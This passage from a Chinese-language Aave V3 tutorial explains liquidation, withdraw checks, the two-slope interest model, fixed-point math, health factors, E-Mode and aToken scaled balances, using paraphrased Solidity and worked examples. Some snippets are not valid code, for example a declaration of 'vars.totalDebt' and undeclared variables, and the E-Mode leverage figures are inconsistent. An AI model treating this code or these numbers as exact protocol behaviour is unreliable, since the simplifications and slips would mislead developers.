    // 清算人接收 aToken\n        _liquidateAToken(usersConfig, collateralReserve, params, vars);\n    } else {\n        // 清算人接收底层资产\n        _burnCollateralAToken(collateralReserve, params, vars);\n    }\n \n    // 5. 协议费用处理\n    if (vars.liquidationProtocolFeeAmount != 0) {\n        uint256 liquidityIndex = collateralReserve.getNormalizedIncome();\n        uint256 scaledDownProtocolFee = vars.liquidationProtocolFeeAmount.rayDiv(liquidityIndex);\n        uint256 scaledDownUserBalance = vars.userCollateralBalance.rayDiv(liquidityIndex);\n \n        if (scaledDownUserBalance &lt;= scaledDownProtocolFee) {\n            // 用户余额不足以支付协议费用\n            vars.liquidationProtocolFeeAmount = vars.userCollateralBalance;\n        }\n \n        IAToken(collateralReserve.aTokenAddress).transferOnLiquidation(\n            params.user,\n            address(IAToken(collateralReserve.aTokenAddress).RESERVE_TREASURY_ADDRESS()),\n            vars.liquidationProtocolFeeAmount\n        );\n    }\n \n    // 6. 更新用户配置\n    if (vars.userDebt == vars.actualDebtToLiquidate) {\n        userConfig.setBorrowing(debtReserve.id, false);\n    }\n \n    if (vars.userCollateralBalance - vars.actualCollateralToLiquidate == 0) {\n        userConfig.setUsingAsCollateral(collateralReserve.id, false);\n        emit ReserveUsedAsCollateralDisabled(params.collateralAsset, params.user);\n    }\n \n    // 7. 从清算人转移债务资产\n    IERC20(params.debtAsset).safeTransferFrom(\n        msg.sender,\n        debtReserveCache.aTokenAddress,\n        vars.actualDebtToLiquidate\n    );\n \n    emit LiquidationCall(\n        params.collateralAsset,\n        params.debtAsset,\n        params.user,\n        vars.actualDebtToLiquidate,\n        vars.actualCollateralToLiquidate,\n        msg.sender,\n        params.receiveAToken\n    );\n}\n5.6 清算奖励计算\nfunction _calculateAvailableCollateralToLiquidate(\n    DataTypes.ReserveData storage collateralReserve,\n    DataTypes.ReserveCache memory debtReserveCache,\n    address collateralAsset,\n    address debtAsset,\n    uint256 debtToCover,\n    uint256 userCollateralBalance,\n    uint256 liquidationBonus,\n    IPriceOracleGetter oracle\n) internal view returns (uint256, uint256, uint256) {\n    AvailableCollateralToLiquidateLocalVars memory vars;\n \n    // 获取价格\n    vars.collateralPrice = oracle.getAssetPrice(collateralAsset);\n    vars.debtAssetPrice = oracle.getAssetPrice(debtAsset);\n \n    // 计算基础抵押品数量\n    // baseCollateral = (debtPrice × debtAmount) / collateralPrice\n    vars.baseCollateral = ((vars.debtAssetPrice * debtToCover * vars.collateralAssetUnit)) /\n        (vars.collateralPrice * vars.debtAssetUnit);\n \n    // 加上清算奖励\n    // maxCollateral = baseCollateral × liquidationBonus\n    vars.maxCollateralToLiquidate = vars.baseCollateral.percentMul(liquidationBonus);\n \n    // 如果用户抵押品不足，调整清算金额\n    if (vars.maxCollateralToLiquidate &gt; userCollateralBalance) {\n        vars.collateralAmount = userCollateralBalance;\n        // 反向计算实际可清算的债务\n        vars.debtAmountNeeded = ((vars.collateralPrice * vars.collateralAmount * vars.debtAssetUnit) /\n            (vars.debtAssetPrice * vars.collateralAssetUnit)).percentDiv(liquidationBonus);\n    } else {\n        vars.collateralAmount = vars.maxCollateralToLiquidate;\n        vars.debtAmountNeeded = debtToCover;\n    }\n \n    // 计算协议费用\n    if (vars.liquidationProtocolFeePercentage != 0) {\n        vars.bonusCollateral = vars.collateralAmount - vars.collateralAmount.percentDiv(liquidationBonus);\n        vars.liquidationProtocolFee = vars.bonusCollateral.percentMul(vars.liquidationProtocolFeePercentage);\n    }\n \n    return (\n        vars.collateralAmount - vars.liquidationProtocolFee,\n        vars.debtAmountNeeded,\n        vars.liquidationProtocolFee\n    );\n}\n5.7 清算示例\n场景: 用户 Alice 存入 10 ETH (价值 $20,000)，借出 15,000 USDC\n      ETH 价格下跌导致健康因子 &lt; 1\n\n参数:\n- ETH 价格: $1,800 (下跌后)\n- 清算阈值: 82.5%\n- 清算奖励: 5%\n- 健康因子: (10 × 1800 × 0.825) / 15000 = 0.99\n\n清算计算:\n- 清算因子: 50% (HF &gt; 0.95)\n- 可清算债务: 15000 × 50% = 7,500 USDC\n- 基础抵押品: 7500 / 1800 = 4.17 ETH\n- 清算人获得: 4.17 × 1.05 = 4.38 ETH\n- 清算人利润: 4.38 × 1800 - 7500 = $378 (约 5%)\n\n\n6. Withdraw (取款功能)\n6.1 取款验证\nfunction validateWithdraw(\n    DataTypes.ReserveCache memory reserveCache,\n    uint256 amount,\n    uint256 userBalance\n) internal pure {\n    require(amount != 0, Errors.INVALID_AMOUNT);\n    require(amount &lt;= userBalance, Errors.NOT_ENOUGH_AVAILABLE_USER_BALANCE);\n \n    (bool isActive, , , , bool isPaused) = reserveCache.reserveConfiguration.getFlags();\n    require(isActive, Errors.RESERVE_INACTIVE);\n    require(!isPaused, Errors.RESERVE_PAUSED);\n}\n6.2 健康因子检查\n取款后必须确保用户健康因子仍然大于 1：\nfunction validateHFAndLtv(\n    mapping(address =&gt; DataTypes.ReserveData) storage reservesData,\n    mapping(uint256 =&gt; address) storage reservesList,\n    mapping(uint8 =&gt; DataTypes.EModeCategory) storage eModeCategories,\n    DataTypes.UserConfigurationMap memory userConfig,\n    address asset,\n    address from,\n    uint256 reservesCount,\n    address oracle,\n    uint8 userEModeCategory\n) internal view {\n    // 只有当用户有债务时才需要检查\n    if (!userConfig.isBorrowingAny()) {\n        return;\n    }\n \n    (, , , , uint256 healthFactor, bool hasZeroLtvCollateral) = GenericLogic.calculateUserAccountData(\n        reservesData,\n        reservesList,\n        eModeCategories,\n        DataTypes.CalculateUserAccountDataParams({\n            userConfig: userConfig,\n            reservesCount: reservesCount,\n            user: from,\n            oracle: oracle,\n            userEModeCategory: userEModeCategory\n        })\n    );\n \n    require(\n        healthFactor &gt;= HEALTH_FACTOR_LIQUIDATION_THRESHOLD,\n        Errors.HEALTH_FACTOR_LOWER_THAN_LIQUIDATION_THRESHOLD\n    );\n}\n\n7. 小结\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n操作主要逻辑关键验证Supply转入资产 → 铸造 aToken储备状态、供应上限Borrow铸造债务代币 → 转出资产抵押品充足、健康因子、借贷上限Repay转入资产 → 销毁债务代币债务存在、金额有效Withdraw销毁 aToken → 转出资产余额充足、健康因子Liquidate偿还债务 → 获得抵押品+奖励健康因子 &lt; 1\n下一章将详细讲解利率模型和数学原理。"},"blockchainguide/DApp_Development/应用场景/defi/aave/03-利率模型与数学原理":{"slug":"blockchainguide/DApp_Development/应用场景/defi/aave/03-利率模型与数学原理","filePath":"blockchainguide/DApp_Development/应用场景/defi/aave/03-利率模型与数学原理.md","title":"03-利率模型与数学原理","links":[],"tags":[],"content":"Aave V3 利率模型与数学原理\n1. 数学库基础\n1.1 精度定义\nAave V3 使用两种高精度定点数来避免浮点数精度问题：\n// WadRayMath.sol\nlibrary WadRayMath {\n    uint256 internal constant WAD = 1e18;   // 18 位精度 (Wad)\n    uint256 internal constant RAY = 1e27;   // 27 位精度 (Ray)\n    uint256 internal constant WAD_RAY_RATIO = 1e9;  // 转换比率\n \n    // 半精度值，用于四舍五入\n    uint256 internal constant HALF_WAD = 0.5e18;\n    uint256 internal constant HALF_RAY = 0.5e27;\n}\n为什么需要两种精度？\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n精度用途示例WAD (1e18)代币金额、价格1.5 ETH = 1.5e18RAY (1e27)利率、指数年利率 5% = 0.05e27\n1.2 核心数学运算\n// Ray 乘法 (带四舍五入)\nfunction rayMul(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    // 为避免溢出，先除后乘\n    assembly {\n        if iszero(or(iszero(b), iszero(gt(a, div(sub(not(0), HALF_RAY), b))))) {\n            revert(0, 0)\n        }\n        c := div(add(mul(a, b), HALF_RAY), RAY)\n    }\n}\n \n// Ray 除法 (带四舍五入)\nfunction rayDiv(uint256 a, uint256 b) internal pure returns (uint256 c) {\n    assembly {\n        if or(iszero(b), iszero(iszero(gt(a, div(sub(not(0), div(b, 2)), RAY))))) {\n            revert(0, 0)\n        }\n        c := div(add(mul(a, RAY), div(b, 2)), b)\n    }\n}\n \n// Wad 转 Ray\nfunction wadToRay(uint256 a) internal pure returns (uint256 b) {\n    assembly {\n        b := mul(a, WAD_RAY_RATIO)\n        if iszero(eq(div(b, WAD_RAY_RATIO), a)) {\n            revert(0, 0)\n        }\n    }\n}\n \n// Ray 转 Wad\nfunction rayToWad(uint256 a) internal pure returns (uint256 b) {\n    assembly {\n        b := div(a, WAD_RAY_RATIO)\n    }\n}\n1.3 百分比运算\n// PercentageMath.sol\nlibrary PercentageMath {\n    uint256 internal constant PERCENTAGE_FACTOR = 1e4;  // 100.00%\n    uint256 internal constant HALF_PERCENTAGE_FACTOR = 0.5e4;\n \n    // 百分比乘法: value * percentage / 100\n    function percentMul(uint256 value, uint256 percentage) internal pure returns (uint256) {\n        if (value == 0 || percentage == 0) {\n            return 0;\n        }\n        return (value * percentage + HALF_PERCENTAGE_FACTOR) / PERCENTAGE_FACTOR;\n    }\n \n    // 百分比除法: value * 100 / percentage\n    function percentDiv(uint256 value, uint256 percentage) internal pure returns (uint256) {\n        return (value * PERCENTAGE_FACTOR + percentage / 2) / percentage;\n    }\n}\n百分比表示：\n\n100% = 10000 (1e4)\n50% = 5000\n5% = 500\n0.01% = 1\n\n\n2. 双斜率利率模型\n2.1 模型概述\nAave V3 采用双斜率（Kinked）利率模型，根据资金利用率动态调整借贷利率：\n利用率 (U) = 总借贷 / 总存款\n\n             利率\n              │\n              │                          ╱\n              │                        ╱\n              │                      ╱ Slope2 (陡)\n              │                    ╱\n              │               ╱---╱ ← 拐点 (U_optimal)\n              │           ╱\n              │       ╱ Slope1 (缓)\n              │   ╱\n              │╱\n              └────────────────────────── 利用率\n                                  U_optimal    100%\n\n2.2 数学公式\n当 U ≤ U_optimal 时（正常区间）：\nBorrowRate = BaseRate + (U / U_optimal) × Slope1\n\n当 U &gt; U_optimal 时（高利用率区间）：\nExcessUtilization = (U - U_optimal) / (1 - U_optimal)\nBorrowRate = BaseRate + Slope1 + ExcessUtilization × Slope2\n\n存款利率：\nSupplyRate = BorrowRate × U × (1 - ReserveFactor)\n\n2.3 代码实现\n// DefaultReserveInterestRateStrategy.sol\ncontract DefaultReserveInterestRateStrategy is IDefaultInterestRateStrategy {\n    // 常量定义\n    uint256 public immutable OPTIMAL_USAGE_RATIO;        // 最优利用率\n    uint256 public immutable MAX_EXCESS_USAGE_RATIO;     // 1 - OPTIMAL_USAGE_RATIO\n \n    // 利率参数\n    uint256 internal immutable _baseVariableBorrowRate;  // 基础利率\n    uint256 internal immutable _variableRateSlope1;      // 斜率1\n    uint256 internal immutable _variableRateSlope2;      // 斜率2\n    uint256 internal immutable _stableRateSlope1;        // 固定利率斜率1\n    uint256 internal immutable _stableRateSlope2;        // 固定利率斜率2\n    uint256 internal immutable _baseStableRateOffset;    // 固定利率偏移\n \n    function calculateInterestRates(\n        DataTypes.CalculateInterestRatesParams calldata params\n    ) external view override returns (uint256, uint256, uint256) {\n        uint256 vars.totalDebt = params.totalStableDebt + params.totalVariableDebt;\n \n        // 计算利用率\n        uint256 currentLiquidityRate;\n        uint256 currentVariableBorrowRate;\n        uint256 currentStableBorrowRate;\n \n        uint256 availableLiquidity = IERC20(params.reserve).balanceOf(params.aToken) +\n            params.liquidityAdded - params.liquidityTaken;\n        uint256 totalLiquidity = availableLiquidity + vars.totalDebt;\n \n        // 利用率 = 总债务 / (可用流动性 + 总债务)\n        vars.currentUsageRatio = totalLiquidity == 0\n            ? 0\n            : vars.totalDebt.rayDiv(totalLiquidity);\n \n        // 计算稳定利率\n        currentStableBorrowRate = _calculateStableRate(vars.currentUsageRatio, vars.totalDebt);\n \n        // 计算可变利率\n        if (vars.currentUsageRatio &gt; OPTIMAL_USAGE_RATIO) {\n            // 超过最优利用率：使用陡峭的斜率2\n            uint256 excessUsageRatio = (vars.currentUsageRatio - OPTIMAL_USAGE_RATIO).rayDiv(\n                MAX_EXCESS_USAGE_RATIO\n            );\n            currentVariableBorrowRate = _baseVariableBorrowRate +\n                _variableRateSlope1 +\n                _variableRateSlope2.rayMul(excessUsageRatio);\n        } else {\n            // 正常利用率：使用平缓的斜率1\n            currentVariableBorrowRate = _baseVariableBorrowRate +\n                vars.currentUsageRatio.rayMul(_variableRateSlope1).rayDiv(OPTIMAL_USAGE_RATIO);\n        }\n \n        // 计算存款利率\n        // supplyRate = borrowRate × utilizationRate × (1 - reserveFactor)\n        currentLiquidityRate = _getOverallBorrowRate(\n            vars.totalDebt,\n            params.totalStableDebt,\n            params.totalVariableDebt,\n            vars.currentAvgStableBorrowRate,\n            currentVariableBorrowRate\n        ).rayMul(vars.currentUsageRatio).percentMul(\n            PercentageMath.PERCENTAGE_FACTOR - params.reserveFactor\n        );\n \n        return (currentLiquidityRate, currentStableBorrowRate, currentVariableBorrowRate);\n    }\n}\n2.4 典型参数配置\n稳定币 (USDC/USDT/DAI)：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n参数值说明最优利用率90%高利用率容忍基础利率0%无基础成本Slope14%正常区间缓慢上升Slope260%超过 90% 后急剧上升\n主流资产 (ETH/WBTC)：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n参数值说明最优利用率80%中等利用率基础利率0%无基础成本Slope14%正常区间Slope280%高利用率惩罚\n波动性资产：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n参数值说明最优利用率45%低利用率目标基础利率0%无基础成本Slope14%正常区间Slope2300%极高惩罚\n\n3. 复利计算\n3.1 线性复利（存款）\n存款利息使用简单的线性复利：\n// MathUtils.sol\nfunction calculateLinearInterest(\n    uint256 rate,        // 年利率 (RAY)\n    uint40 lastUpdateTimestamp\n) internal view returns (uint256) {\n    uint256 result = rate * (block.timestamp - uint256(lastUpdateTimestamp));\n    unchecked {\n        // rate × time / SECONDS_PER_YEAR + 1\n        result = result / SECONDS_PER_YEAR + WadRayMath.RAY;\n    }\n    return result;\n}\n公式：\n利息因子 = 1 + rate × Δt / SECONDS_PER_YEAR\n新指数 = 旧指数 × 利息因子\n\n3.2 复合复利（借贷）\n借贷利息使用泰勒展开近似的复合复利：\nfunction calculateCompoundedInterest(\n    uint256 rate,\n    uint40 lastUpdateTimestamp,\n    uint256 currentTimestamp\n) internal pure returns (uint256) {\n    uint256 exp = currentTimestamp - uint256(lastUpdateTimestamp);\n \n    if (exp == 0) {\n        return WadRayMath.RAY;\n    }\n \n    uint256 expMinusOne;\n    uint256 expMinusTwo;\n    uint256 basePowerTwo;\n    uint256 basePowerThree;\n \n    unchecked {\n        expMinusOne = exp - 1;\n        expMinusTwo = exp &gt; 2 ? exp - 2 : 0;\n \n        basePowerTwo = rate.rayMul(rate) / (SECONDS_PER_YEAR * SECONDS_PER_YEAR);\n        basePowerThree = basePowerTwo.rayMul(rate) / SECONDS_PER_YEAR;\n    }\n \n    // 泰勒展开: e^(rt) ≈ 1 + rt + (rt)²/2! + (rt)³/3!\n    uint256 secondTerm = exp * expMinusOne * basePowerTwo;\n    unchecked {\n        secondTerm /= 2;\n    }\n    uint256 thirdTerm = exp * expMinusOne * expMinusTwo * basePowerThree;\n    unchecked {\n        thirdTerm /= 6;\n    }\n \n    return WadRayMath.RAY + (rate * exp) / SECONDS_PER_YEAR + secondTerm + thirdTerm;\n}\n泰勒展开公式：\ne^(rt) ≈ 1 + rt + (rt)²/2! + (rt)³/3! + ...\n\n其中：\n- r = 年利率\n- t = 时间（秒）\n- rt = r × t / SECONDS_PER_YEAR\n\n3.3 为什么使用泰勒展开？\n\nGas 效率：避免指数运算的高成本\n精度足够：对于短时间间隔（通常几秒到几小时），三阶展开精度足够\n可预测性：确定性计算，无浮点误差\n\n精度分析：\n时间间隔    | 年利率 10% | 误差\n1 秒       | 0.0000003% | &lt; 1e-15\n1 小时      | 0.00114%   | &lt; 1e-10\n1 天       | 0.0274%    | &lt; 1e-8\n1 周       | 0.192%     | &lt; 1e-6\n\n\n4. 指数系统\n4.1 流动性指数 (Liquidity Index)\n// 更新流动性指数\nfunction _updateIndexes(\n    DataTypes.ReserveData storage reserve,\n    DataTypes.ReserveCache memory reserveCache\n) internal {\n    // 计算自上次更新以来的累积利息\n    uint256 cumulatedLiquidityInterest = MathUtils.calculateLinearInterest(\n        reserveCache.currLiquidityRate,\n        reserveCache.reserveLastUpdateTimestamp\n    );\n \n    // 新指数 = 旧指数 × 累积利息\n    reserveCache.nextLiquidityIndex = cumulatedLiquidityInterest.rayMul(\n        reserveCache.currLiquidityIndex\n    );\n    reserve.liquidityIndex = reserveCache.nextLiquidityIndex.toUint128();\n}\n用途：\n\n追踪存款的累积收益\n计算 aToken 的实际余额\n\n计算示例：\n初始存款: 100 USDC\n存款时指数: 1.05\n当前指数: 1.10\n\n实际余额 = 缩放余额 × 当前指数\n         = (100 / 1.05) × 1.10\n         = 95.24 × 1.10\n         = 104.76 USDC\n\n收益 = 104.76 - 100 = 4.76 USDC\n\n4.2 可变借贷指数 (Variable Borrow Index)\n// 更新可变借贷指数\nif (reserveCache.currScaledVariableDebt != 0) {\n    uint256 cumulatedVariableBorrowInterest = MathUtils.calculateCompoundedInterest(\n        reserveCache.currVariableBorrowRate,\n        reserveCache.reserveLastUpdateTimestamp,\n        block.timestamp\n    );\n \n    reserveCache.nextVariableBorrowIndex = cumulatedVariableBorrowInterest.rayMul(\n        reserveCache.currVariableBorrowIndex\n    );\n    reserve.variableBorrowIndex = reserveCache.nextVariableBorrowIndex.toUint128();\n}\n用途：\n\n追踪可变利率债务的累积利息\n计算用户的实际债务\n\n\n5. 健康因子计算\n5.1 公式定义\n健康因子 (HF) = Σ(抵押品价值_i × 清算阈值_i) / 总债务\n\n其中：\n- 抵押品价值 = 代币数量 × 价格\n- 清算阈值 = 该资产可用于抵押的最大比例\n\n5.2 代码实现\n// GenericLogic.sol\nfunction calculateUserAccountData(\n    mapping(address =&gt; DataTypes.ReserveData) storage reservesData,\n    mapping(uint256 =&gt; address) storage reservesList,\n    mapping(uint8 =&gt; DataTypes.EModeCategory) storage eModeCategories,\n    DataTypes.CalculateUserAccountDataParams memory params\n) internal view returns (\n    uint256 totalCollateralInBaseCurrency,\n    uint256 totalDebtInBaseCurrency,\n    uint256 avgLtv,\n    uint256 avgLiquidationThreshold,\n    uint256 healthFactor,\n    bool hasZeroLtvCollateral\n) {\n    CalculateUserAccountDataVars memory vars;\n \n    // 遍历用户所有储备\n    while (vars.i &lt; params.reservesCount) {\n        if (!params.userConfig.isUsingAsCollateralOrBorrowing(vars.i)) {\n            unchecked { ++vars.i; }\n            continue;\n        }\n \n        vars.currentReserveAddress = reservesList[vars.i];\n        DataTypes.ReserveData storage currentReserve = reservesData[vars.currentReserveAddress];\n        DataTypes.ReserveConfigurationMap memory currentReserveConfig = currentReserve.configuration;\n \n        // 获取资产价格和单位\n        vars.assetPrice = IPriceOracleGetter(params.oracle).getAssetPrice(vars.currentReserveAddress);\n        vars.assetUnit = 10 ** currentReserveConfig.getDecimals();\n \n        // 获取风险参数\n        (vars.ltv, vars.liquidationThreshold, vars.liquidationBonus, , ) =\n            currentReserveConfig.getParams();\n \n        // E-Mode 参数覆盖\n        if (params.userEModeCategory != 0) {\n            DataTypes.EModeCategory storage eModeCategory = eModeCategories[params.userEModeCategory];\n            if (currentReserveConfig.getEModeCategory() == params.userEModeCategory) {\n                vars.ltv = eModeCategory.ltv;\n                vars.liquidationThreshold = eModeCategory.liquidationThreshold;\n            }\n        }\n \n        // 累加抵押品价值\n        if (params.userConfig.isUsingAsCollateral(vars.i)) {\n            vars.userBalanceInBaseCurrency = _getUserBalanceInBaseCurrency(\n                vars.currentReserveAddress,\n                currentReserve,\n                vars.assetPrice,\n                vars.assetUnit\n            );\n \n            totalCollateralInBaseCurrency += vars.userBalanceInBaseCurrency;\n \n            if (vars.ltv != 0) {\n                avgLtv += vars.userBalanceInBaseCurrency * vars.ltv;\n            } else {\n                hasZeroLtvCollateral = true;\n            }\n \n            avgLiquidationThreshold += vars.userBalanceInBaseCurrency * vars.liquidationThreshold;\n        }\n \n        // 累加债务价值\n        if (params.userConfig.isBorrowing(vars.i)) {\n            totalDebtInBaseCurrency += _getUserDebtInBaseCurrency(\n                vars.currentReserveAddress,\n                currentReserve,\n                vars.assetPrice,\n                vars.assetUnit\n            );\n        }\n \n        unchecked { ++vars.i; }\n    }\n \n    // 计算加权平均值\n    if (totalCollateralInBaseCurrency != 0) {\n        avgLtv = avgLtv / totalCollateralInBaseCurrency;\n        avgLiquidationThreshold = avgLiquidationThreshold / totalCollateralInBaseCurrency;\n    }\n \n    // 计算健康因子\n    healthFactor = totalDebtInBaseCurrency == 0\n        ? type(uint256).max\n        : totalCollateralInBaseCurrency.percentMul(avgLiquidationThreshold).wadDiv(totalDebtInBaseCurrency);\n}\n5.3 健康因子示例\n用户资产：\n- 10 ETH @ $2000 = $20,000 (清算阈值 82.5%)\n- 5000 USDC @ $1 = $5,000 (清算阈值 85%)\n\n用户债务：\n- 15,000 USDT\n\n计算：\n抵押品价值加权 = 20,000 × 0.825 + 5,000 × 0.85 = 16,500 + 4,250 = 20,750\n健康因子 = 20,750 / 15,000 = 1.383\n\n结论：HF &gt; 1，头寸安全\n\n\n6. E-Mode 数学\n6.1 E-Mode 资本效率\nE-Mode 允许相关性资产获得更高的 LTV 和清算阈值：\n普通模式:\n- ETH LTV: 80%\n- ETH 清算阈值: 82.5%\n\nE-Mode (稳定币):\n- USDC/USDT/DAI LTV: 97%\n- 清算阈值: 98%\n\n6.2 效率对比\n场景：用户存入 10,000 USDC，想借出其他稳定币\n\n普通模式:\n- 最大借贷 = 10,000 × 80% = 8,000 USDC\n- 杠杆率 = 1.8x\n\nE-Mode (稳定币):\n- 最大借贷 = 10,000 × 97% = 9,700 USDC\n- 杠杆率 = 33x (理论最大)\n\n资本效率提升 = 9,700 / 8,000 = 1.21x (21% 提升)\n\n6.3 E-Mode 参数应用\n// 在计算用户账户数据时应用 E-Mode 参数\nif (EModeLogic.isInEModeCategory(params.userEModeCategory, vars.eModeAssetCategory)) {\n    DataTypes.EModeCategory storage eModeCategory = eModeCategories[params.userEModeCategory];\n \n    // 使用 E-Mode 的更高参数\n    vars.ltv = eModeCategory.ltv;\n    vars.liquidationThreshold = eModeCategory.liquidationThreshold;\n \n    // E-Mode 可能使用特定的价格预言机\n    if (eModeCategory.priceSource != address(0)) {\n        vars.assetPrice = IPriceOracleGetter(eModeCategory.priceSource)\n            .getAssetPrice(vars.currentReserveAddress);\n    }\n}\n\n7. 清算奖励计算\n7.1 奖励公式\n基础抵押品 = 债务金额 × 债务价格 / 抵押品价格\n清算人获得 = 基础抵押品 × 清算奖励比例\n协议费用 = (清算人获得 - 基础抵押品) × 协议费率\n\n7.2 代码实现\nfunction _calculateAvailableCollateralToLiquidate(\n    DataTypes.ReserveData storage collateralReserve,\n    DataTypes.ReserveCache memory debtReserveCache,\n    address collateralAsset,\n    address debtAsset,\n    uint256 debtToCover,\n    uint256 userCollateralBalance,\n    uint256 liquidationBonus,\n    IPriceOracleGetter oracle\n) internal view returns (uint256, uint256, uint256) {\n    // 获取价格\n    uint256 collateralPrice = oracle.getAssetPrice(collateralAsset);\n    uint256 debtAssetPrice = oracle.getAssetPrice(debtAsset);\n \n    // 基础抵押品 = 债务价值 / 抵押品价格\n    uint256 baseCollateral = (debtAssetPrice * debtToCover * collateralAssetUnit) /\n        (collateralPrice * debtAssetUnit);\n \n    // 含奖励的抵押品 = 基础抵押品 × 清算奖励\n    uint256 maxCollateralToLiquidate = baseCollateral.percentMul(liquidationBonus);\n \n    // 如果用户抵押品不足\n    if (maxCollateralToLiquidate &gt; userCollateralBalance) {\n        collateralAmount = userCollateralBalance;\n        // 反推可清算债务\n        debtAmountNeeded = ((collateralPrice * collateralAmount * debtAssetUnit) /\n            (debtAssetPrice * collateralAssetUnit)).percentDiv(liquidationBonus);\n    } else {\n        collateralAmount = maxCollateralToLiquidate;\n        debtAmountNeeded = debtToCover;\n    }\n \n    // 协议费用 = 奖励部分 × 协议费率\n    uint256 bonusCollateral = collateralAmount - collateralAmount.percentDiv(liquidationBonus);\n    uint256 liquidationProtocolFee = bonusCollateral.percentMul(liquidationProtocolFeePercentage);\n \n    return (\n        collateralAmount - liquidationProtocolFee,  // 清算人获得\n        debtAmountNeeded,                           // 需偿还债务\n        liquidationProtocolFee                      // 协议费用\n    );\n}\n7.3 清算计算示例\n场景：\n- 债务: 7,500 USDC\n- ETH 价格: $1,800\n- 清算奖励: 5% (10500 = 105%)\n- 协议费率: 10%\n\n计算：\n1. 基础抵押品 = 7,500 / 1,800 = 4.167 ETH\n2. 含奖励抵押品 = 4.167 × 1.05 = 4.375 ETH\n3. 奖励部分 = 4.375 - 4.167 = 0.208 ETH\n4. 协议费用 = 0.208 × 10% = 0.0208 ETH\n5. 清算人获得 = 4.375 - 0.0208 = 4.354 ETH\n\n清算人利润 = 4.354 × $1,800 - $7,500 = $337.2 (4.5% 利润)\n\n\n8. 小结\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n组件数学基础精度利率计算双斜率模型RAY (1e27)复利计算泰勒展开RAY (1e27)健康因子加权平均WAD (1e18)清算奖励百分比运算1e4\n关键公式速查：\n利用率: U = TotalDebt / TotalLiquidity\n借贷利率: R = BaseRate + Slope × U\n存款利率: S = R × U × (1 - ReserveFactor)\n健康因子: HF = (Collateral × LiqThreshold) / Debt\n流动性指数: LI_new = LI_old × (1 + rate × Δt)\n\n下一章将详细讲解 aToken 和债务代币的代币化机制。"},"blockchainguide/DApp_Development/应用场景/defi/aave/04-代币化机制":{"slug":"blockchainguide/DApp_Development/应用场景/defi/aave/04-代币化机制","filePath":"blockchainguide/DApp_Development/应用场景/defi/aave/04-代币化机制.md","title":"04-代币化机制","links":[],"tags":[],"content":"Aave V3 代币化机制\n1. 概述\nAave V3 使用三种代币来表示用户的存款和债务：\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n代币类型合约用途特点aTokenAToken.sol存款凭证余额随利息自动增长StableDebtTokenStableDebtToken.sol固定利率债务利率在借款时锁定VariableDebtTokenVariableDebtToken.sol浮动利率债务利率随市场波动\n\n2. aToken 详解\n2.1 缩放余额机制\naToken 最核心的创新是**缩放余额（Scaled Balance）**机制：\n实际余额 (Real Balance) = 缩放余额 (Scaled Balance) × 流动性指数 (Liquidity Index)\n\n为什么使用缩放余额？\n传统方式：每次利息累积都更新所有用户余额\n问题：Gas 消耗巨大，不可扩展\n\nAave 方式：存储缩放余额，读取时乘以全局指数\n优势：只需更新一个全局变量，所有用户余额自动增长\n\n2.2 余额计算\n// ScaledBalanceTokenBase.sol\nabstract contract ScaledBalanceTokenBase is MintableIncentivizedERC20, IScaledBalanceToken {\n \n    // 获取实际余额\n    function balanceOf(address user) public view virtual override returns (uint256) {\n        // 实际余额 = 缩放余额 × 当前流动性指数\n        return super.balanceOf(user).rayMul(POOL.getReserveNormalizedIncome(_underlyingAsset));\n    }\n \n    // 获取缩放余额（存储的原始值）\n    function scaledBalanceOf(address user) external view override returns (uint256) {\n        return super.balanceOf(user);\n    }\n \n    // 获取缩放总供应量\n    function scaledTotalSupply() public view virtual override returns (uint256) {\n        return super.totalSupply();\n    }\n \n    // 获取实际总供应量\n    function totalSupply() public view virtual override returns (uint256) {\n        uint256 currentSupplyScaled = super.totalSupply();\n        if (currentSupplyScaled == 0) {\n            return 0;\n        }\n        return currentSupplyScaled.rayMul(POOL.getReserveNormalizedIncome(_underlyingAsset));\n    }\n}\n2.3 铸造流程\n// AToken.sol\nfunction mint(\n    address caller,\n    address onBehalfOf,\n    uint256 amount,\n    uint256 index\n) external virtual override onlyPool returns (bool) {\n    // 计算缩放金额\n    uint256 amountScaled = amount.rayDiv(index);\n    require(amountScaled != 0, Errors.INVALID_MINT_AMOUNT);\n \n    // 铸造缩放后的代币\n    _mint(onBehalfOf, amountScaled.toUint128());\n \n    // 发射事件（显示实际金额）\n    emit Transfer(address(0), onBehalfOf, amount);\n    emit Mint(caller, onBehalfOf, amount, amountScaled, index);\n \n    // 返回是否为首次存款\n    return scaledBalanceOf(onBehalfOf) == amountScaled;\n}\n铸造示例：\n用户存入: 100 USDC\n当前流动性指数: 1.05 (1.05e27)\n\n缩放金额 = 100 / 1.05 = 95.24 aUSDC (存储)\n实际余额 = 95.24 × 1.05 = 100 aUSDC (显示)\n\n一年后，流动性指数变为 1.10:\n实际余额 = 95.24 × 1.10 = 104.76 aUSDC\n收益 = 4.76 USDC (自动累积)\n\n2.4 销毁流程\nfunction burn(\n    address from,\n    address receiverOfUnderlying,\n    uint256 amount,\n    uint256 index\n) external virtual override onlyPool {\n    // 计算缩放金额\n    uint256 amountScaled = amount.rayDiv(index);\n    require(amountScaled != 0, Errors.INVALID_BURN_AMOUNT);\n \n    // 销毁 aToken\n    _burn(from, amountScaled.toUint128());\n \n    // 转移底层资产给接收者\n    if (receiverOfUnderlying != address(this)) {\n        IERC20(_underlyingAsset).safeTransfer(receiverOfUnderlying, amount);\n    }\n \n    emit Transfer(from, address(0), amount);\n    emit Burn(from, receiverOfUnderlying, amount, amountScaled, index);\n}\n2.5 转账处理\naToken 支持标准 ERC-20 转账：\nfunction _transfer(\n    address from,\n    address to,\n    uint256 amount,\n    bool validate\n) internal {\n    // 计算缩放金额\n    uint256 index = POOL.getReserveNormalizedIncome(_underlyingAsset);\n    uint256 